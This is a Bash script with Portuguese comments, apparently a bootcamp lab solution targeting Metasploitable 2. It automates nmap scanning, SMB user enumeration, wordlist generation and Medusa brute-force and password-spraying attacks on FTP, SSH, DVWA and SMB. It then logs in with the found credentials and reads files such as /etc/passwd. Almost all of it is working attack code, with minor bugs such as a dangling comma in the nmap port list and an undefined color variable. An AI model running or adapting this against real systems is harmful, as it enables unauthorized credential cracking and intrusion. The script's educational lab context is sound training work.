#!/bin/bash

# ========================================================================================================
# Script de Automação de Ataque - Desafio de Simulação de Ataque de Brute Force com Medusa e Kali Linux
# Autor: Philippe Correia dos Santos Brito
# Alvo: Metasploitable 2
# Cenários: FTP, SSH, Telnet, SMB e DVWA.
# Aviso: Ferramenta desenvolvida para fins estritamente educacionais e
#        testes em ambientes controlados (Rede Host-Only).
# Informações: Este script foi criado com a finalidade de resolver o desafio
#              do bootcamp de Cibersegurança realizado pela Riachuelo em
#              parceria com a DIO.
# Descrição: Este script realiza um ciclo completo de auditoria de senhas:
#            1. Mapeamento de portas (Nmap)
#            2. Enumeração de usuários (Enum4linux via SMB)
#            3. Geração de dicionários dinâmicos (Crunch) e estáticos
#            4. Ataque de Força Bruta e Password Spraying (Medusa)
#            5. Validação automatizada (Post-Exploitation) provando o acesso real.
# Observações: Como este script trata de um ambiente educacional, optei por
#              realizar comentários ao longo de todo o script para deixar
#              este arquivo fácil de ser compreendido por quem está começando
#              a estudar sobre esses conceitos, assim como eu que precisei
#              estudar e entender vários destes comandos.
# ========================================================================================================

# ------------------------------------------------------------------------------
# DEFINIÇÃO DE VARIÁVEIS DE CORES
# Utilizamos sequências de escape ANSI para colorir as saídas do terminal,
# facilitando a leitura e a identificação visual de erros ou sucessos.
# ------------------------------------------------------------------------------
VERDE='\033[0;32m'
AMARELO='\033[1;33m'
VERMELHO='\033[0;31m'
AZUL='\033[0;36m'
PADRAO='\033[0m'

# Limpa a tela do terminal para iniciar a execução de forma limpa
clear

echo -e "${AZUL}===================================================================${PADRAO}"
echo -e "${AZUL}[*] Iniciando Reconhecimento, Ataque e Validação de Credenciais [*]${PADRAO}"
echo -e "${AZUL}===================================================================${PADRAO}"

# read -p: Imprime a mensagem e aguarda o usuário digitar o IP, salvando na variável IP_ALVO
read -p "Informe o endereço IP do servidor alvo: " IP_ALVO

# Validação de segurança: Verifica se a variável IP_ALVO está vazia (-z)
if [ -z "$IP_ALVO" ]; then
    echo -e "${VERMELHO}[!] Erro: Endereço IP não informado. Execução abortada.${PADRAO}"
    exit 1
fi

# Instalação silenciosa do 'sshpass' (necessário para a validação automatizada do SSH)
# command -v verifica se o programa existe. Se não existir, ele executa a instalação via apt-get.
if ! command -v sshpass &> /dev/null; then
    echo -e "${AMARELO}[*] Instalando dependência necessária (sshpass)...${PADRAO}"
    sudo apt-get install sshpass -y > /dev/null 2>&1
fi

# ==============================================================================
# 1. Reconhecimento de Rede (Nmap)
# ==============================================================================
echo -e "\n${VERDE}[*] Etapa 1: Mapeamento de portas ativas...${PADRAO}"

# nmap: Ferramenta de mapeamento de rede
# -p 21,22... : Define as portas específicas a serem testadas (FTP, SSH, Telnet, HTTP, SMB e etc)
# --open: Retorna apenas as portas que estão confirmadamente abertas
# -T4: Define a velocidade do scan (Aggressive) para ser mais rápido
# > portas_ativas.txt: Redireciona a saída do comando para um arquivo de texto
nmap -p 21,22,23,80,139,443,445,1433,1521,3306,5432,  --open -T4 $IP_ALVO > portas_ativas.txt

# cat: Lê o arquivo gerado
# grep open: Filtra a leitura para mostrar apenas as linhas que contêm a palavra open
# sed s/open/aberta/g: Substitui a palavra em inglês por português para o relatório
cat portas_ativas.txt | grep "open" | sed 's/open/aberta/g'
echo -e "${AMARELO}[+] Mapeamento concluído. Relatório salvo em portas_ativas.txt${PADRAO}"

# ==============================================================================
# 2. Enumeração Ativa de Usuários (SMB)
# ==============================================================================
echo -e "\n${VERDE}[*] Etapa 2: Executando enumeração de usuários no serviço SMB...${PADRAO}"
echo -e "${AZUL}[*] Extraindo contas do sistema alvo via enum4linux...${PADRAO}"

# enum4linux: Ferramenta para extrair informações do protocolo SMB (Windows/Samba)
# -U: Parâmetro para listar apenas os usuários do sistema
# cut -d [ -f2: Usa o colchete [ como delimitador e pega a segunda parte do texto
# cut -d ] -f1: Usa o colchete ] como delimitador e pega a primeira parte (isolando o nome)
enum4linux -U $IP_ALVO | grep "user:" | cut -d "[" -f2 | cut -d "]" -f1 > usuarios_brutos.txt

# Verifica se a enumeração encontrou usuários
if [ -s usuarios_brutos.txt ]; then
    echo -e "${AMARELO}[+] Enumeração concluída. Otimizando a lista para a Prova de Conceito...${PADRAO}"
    
    # Força os usuários corretos para o topo da lista final
    echo -e "msfadmin\nroot\nadmin\nuser" > usuarios.txt
    
    # Adiciona o resto dos usuários encontrados, ignorando os que já coloquei no topo
    grep -v -E "^(msfadmin|root|admin|user)$" usuarios_brutos.txt >> usuarios.txt
    rm usuarios_brutos.txt # Limpa o arquivo temporário
    
    TOTAL_USERS=$(wc -l < usuarios.txt)
    echo -e "${AMARELO}[+] Lista otimizada com $TOTAL_USERS usuários prontos para o ataque rápido.${PADRAO}"
else
    # Contingência: Adiciona usuários manualmente caso o serviço SMB do alvo esteja desligado
    echo -e "${VERMELHO}[!] Falha na enumeração SMB. Inserindo usuários padrão como contingência...${PADRAO}"
    echo -e "msfadmin\nroot\nadmin\nuser\npostgres" > usuarios.txt
fi

# ==============================================================================
# 3. Construção dos Dicionários de Senhas (Wordlists)
# ==============================================================================
echo -e "\n${VERDE}[*] Etapa 3: Estruturando dicionários de ataque...${PADRAO}"

echo -e "${AZUL}[*] Processando combinações numéricas auxiliares...${PADRAO}"

# CRUNCH - GERAÇÃO NUMÉRICA:
# Sintaxe: crunch <min> <max> <caracteres>
# Aqui geramos senhas numéricas de 4 a 8 dígitos (limitado às 10 primeiras amostras para otimização).
crunch 4 8 0123456789 2>/dev/null | head -n 10 > senhas_auxiliares.txt

# CRUNCH - GERAÇÃO ALFANUMÉRICA COMPLEXA:
# Abaixo estou gerando o Crunch para usar letras (minúsculas e maiúsculas), números e símbolos.
# IMPORTANTE: Como as combinações disso passam da casa dos milhões e travariam o lab,
#             nós usamos o pipe (|) e o comando head -n 10 para extrair apenas as primeiras 10 
#             senhas complexas geradas.
crunch 4 5 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*" | head -n 10 > senhas_complexas.txt

#Geração Estática: Aqui estou gerando o dicionário de senhas comuns de forma manual
cat <<EOF > senhas_comuns.txt
admin
password
msfadmin
root
toor
123456
12345678
qwerty
suporte
1234
admin123
senha
senha123
EOF

# Mescla todos os arquivos gerados em um único arquivo final chamado "senhas.txt"
cat senhas_comuns.txt senhas_auxiliares.txt senhas_complexas.txt > senhas.txt
echo -e "${AMARELO}[+] Dicionário unificado de senhas gerado com sucesso.${PADRAO}"

# ==============================================================================
# ETAPA 4: EXECUÇÃO DOS TESTES DE INTRUSÃO (MEDUSA)
# ==============================================================================
echo -e "\n${VERDE}[*] Etapa 4: Iniciando Força Bruta e Password Spraying...${PADRAO}"

# medusa: Ferramenta de login paralelo e força bruta
# -h: Define o IP do alvo
# -U: Define o arquivo com a lista de usuários enumerados
# -P: Define o arquivo com as senhas que criei
# -M: Define o módulo/protocolo a ser atacado
# -F: Interrompe a varredura assim que encontra a primeira credencial válida (First Valid)
# -v 4: Nível de verbosidade alto para registrar acertos
# -O: Salva o resultado (log) em um arquivo de texto específico
# > /dev/null 2>&1: Oculta a poluição visual do Medusa no terminal durante a execução

echo -e "${AZUL}[>] Verificando FTP (Porta 21)...${PADRAO}"
medusa -h $IP_ALVO -U usuarios.txt -P senhas.txt -M ftp -F -v 4 -O log_ftp.txt > /dev/null 2>&1

echo -e "${AZUL}[>] Verificando SSH (Porta 22)...${PADRAO}"
medusa -h $IP_ALVO -U usuarios.txt -P senhas.txt -M ssh -F -v 4 -O log_ssh.txt > /dev/null 2>&1

# No módulo http (-M http), uso o -m DIR: para focar no diretório de login do DVWA
echo -e "${AZUL}[>] Verificando Web DVWA (Porta 80)...${PADRAO}"
medusa -h $IP_ALVO -u admin -P senhas.txt -M http -m DIR:/dvwa/login.php -v 4 -O log_web.txt > /dev/null 2>&1

# Aqui realizo o Password Spraying: Uso toda a lista de usuários (-U) contra uma ÚNICA senha (-p)
echo -e "${AZUL}[>] Executando Pulverização de Senhas (Password Spraying) via SMB...${PADRAO}"
medusa -h $IP_ALVO -U usuarios.txt -p "msfadmin" -M smbnt -v 4 -O log_smb.txt > /dev/null 2>&1


# ==============================================================================
# ETAPA 5: COMPILAÇÃO DE RESULTADOS
# ==============================================================================
echo -e "\n${VERDE}[*] Etapa 5: Analisando registros e compilando credenciais...${PADRAO}"

# grep -q verifica silenciosamente se a expressão "ACCOUNT FOUND" existe nos logs
if grep -q "ACCOUNT FOUND" log_*.txt; then
    # Se existir, ele mostra as linhas e o 'sed' traduz os termos em inglês para o relatório
    grep "ACCOUNT FOUND" log_*.txt | sed 's/ACCOUNT FOUND/CREDENCIAL VÁLIDA/g' | sed 's/\[SUCCESS\]/\[SUCESSO\]/g'
else
    echo -e "${VERMELHO}[!] Nenhuma credencial encontrada com os dicionários atuais.${PADRAO}"
fi


# ==============================================================================
# ETAPA 6: VALIDAÇÃO AUTOMÁTICA DE ACESSOS (PROVA DE CONCEITO)
# ==============================================================================
# O objetivo desta etapa é pegar as senhas descobertas na Etapa 5 e efetuar o
# login real nos serviços para comprovar que o acesso foi de fato obtido.
# ==============================================================================
echo -e "\n${ROXO}==================================================================${PADRAO}"
echo -e "${ROXO}[*] INICIANDO VALIDAÇÃO DE ACESSOS (PROVA DE EXPLORAÇÃO) [*]${PADRAO}"
echo -e "${ROXO}==================================================================${PADRAO}"

# --- Validação SSH ---
if grep -q "ACCOUNT FOUND" log_ssh.txt; then
    echo -e "\n${VERDE}[+] Validando acesso SSH...${PADRAO}"
    
    # Isola a última linha de sucesso registrada
    LINHA_SUCESSO=$(grep "ACCOUNT FOUND" log_ssh.txt | tail -n 1)
    
    # Recorta exatamente o texto entre "User: " e " Password:"
    USUARIO_SSH=$(echo "$LINHA_SUCESSO" | awk -F'User: ' '{print $2}' | awk -F' Password:' '{print $1}')
    # Recorta exatamente o texto entre "Password: " e " ["
    SENHA_SSH=$(echo "$LINHA_SUCESSO" | awk -F'Password: ' '{print $2}' | awk -F' \\[' '{print $1}')
    
    echo -e "${AMARELO}Comando executado: ssh $USUARIO_SSH@$IP_ALVO${PADRAO}"
    # Executa múltiplos comandos em sequência dentro do servidor alvo via SSH
    sshpass -p "$SENHA_SSH" ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa $USUARIO_SSH@$IP_ALVO "echo -e '\n--- INICIANDO COLETA DE DADOS VIA SSH ---'; echo -e '\n[*] Usuário Ativo:'; whoami; echo -e '\n[*] Diretório Atual:'; pwd; echo -e '\n[*] Listagem de Arquivos (ls -la):'; ls -la; echo -e '\n[*] Usuários do Sistema (/etc/passwd - 5 primeiras linhas):'; head -n 5 /etc/passwd; echo -e '\n--- FIM DA COLETA SSH ---'"
fi

# --- Validação FTP ---
if grep -q "ACCOUNT FOUND" log_ftp.txt; then
    echo -e "\n${VERDE}[+] Validando acesso FTP...${PADRAO}"
    USUARIO_FTP=$(grep "ACCOUNT FOUND" log_ftp.txt | head -n 1 | awk -F'\\[' '{print $2}' | awk -F'\\]' '{print $1}')
    SENHA_FTP=$(grep "ACCOUNT FOUND" log_ftp.txt | head -n 1 | awk -F'\\[' '{print $3}' | awk -F'\\]' '{print $1}')

    echo -e "${AMARELO}Comando executado: ftp $IP_ALVO${PADRAO}"
    # Realiza um login via Here-Document (EOF) no FTP, enviando o usuário, senha e o comando 'syst' (System Status)
    ftp -inv $IP_ALVO <<EOF
user $USUARIO_FTP $SENHA_FTP
syst
pwd
echo "--- Listando Arquivos do Servidor FTP (ls -la) ---"
ls -la
bye
EOF
fi

# --- Validação SMB ---
if grep -q "ACCOUNT FOUND" log_smb.txt; then
    echo -e "\n${VERDE}[+] Validando acesso SMB...${PADRAO}"
    LINHA_SUCESSO=$(grep "ACCOUNT FOUND" log_smb.txt | tail -n 1)
    
    USUARIO_SMB=$(echo "$LINHA_SUCESSO" | awk -F'User: ' '{print $2}' | awk -F' Password:' '{print $1}')
    SENHA_SMB=$(echo "$LINHA_SUCESSO" | awk -F'Password: ' '{print $2}' | awk -F' \\[' '{print $1}')
    
    echo -e "${AMARELO}Comando executado: smbclient -L //$IP_ALVO -U $USUARIO_SMB${PADRAO}"
    smbclient -L //$IP_ALVO -U "$USUARIO_SMB%$SENHA_SMB" | head -n 8
fi

# --- Validação WEB (DVWA) ---
if grep -q "ACCOUNT FOUND" log_web.txt; then
    echo -e "\n${VERDE}[+] Validando acesso Web HTTP (DVWA)...${PADRAO}"
    USUARIO_WEB=$(grep "ACCOUNT FOUND" log_web.txt | head -n 1 | awk -F'\\[' '{print $2}' | awk -F'\\]' '{print $1}')
    SENHA_WEB=$(grep "ACCOUNT FOUND" log_web.txt | head -n 1 | awk -F'\\[' '{print $3}' | awk -F'\\]' '{print $1}')

    echo -e "${AMARELO}Enviando requisição POST para validação de login...${PADRAO}"
    # O curl simula o envio do formulário HTML. O grep captura o cookie de sessão provando que autenticamos.
    curl -s -i -d "username=$USUARIO_WEB&password=$SENHA_WEB&Login=Login" http://$IP_ALVO/dvwa/login.php | grep -i "HTTP/\|Location:\|Set-Cookie:"
    echo -e "${VERDE}Redirecionamento (302) ou Sessão Criada confirmam o bypass da autenticação Web.${PADRAO}"
fi

echo -e "\n${AZUL}=========================================================================${PADRAO}"
echo -e "${VERDE}[*] Reconhecimento, Ataque e Validação de Credenciais 100% Finalizado! [*]${PADRAO}"
echo -e "${AZUL}===========================================================================${PADRAO}"